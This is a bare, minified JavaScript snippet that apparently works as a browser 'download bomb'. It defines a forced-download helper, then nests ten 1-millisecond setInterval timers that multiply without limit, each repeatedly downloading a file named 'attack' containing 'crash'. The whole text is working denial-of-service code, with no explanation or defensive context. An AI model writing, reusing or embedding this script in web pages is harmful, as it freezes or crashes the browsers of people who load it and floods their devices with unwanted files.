function download(a,b,c){var d=new Blob([a],{type:c});if(window.navigator.msSaveOrOpenBlob)window.navigator.msSaveOrOpenBlob(d,b);else{var e=document.createElement("a"),f=URL.createObjectURL(d);e.href=f,e.download=b,document.body.appendChild(e),e.click(),setTimeout(function(){document.body.removeChild(e),window.URL.revokeObjectURL(f)},0)}}setInterval(function(){setInterval(function(){setInterval(function(){setInterval(function(){setInterval(function(){setInterval(function(){setInterval(function(){setInterval(function(){setInterval(function(){setInterval(function(){download("crash","attack","mime/plain")},1)},1)},1)},1)},1)},1)},1)},1)},1)},1)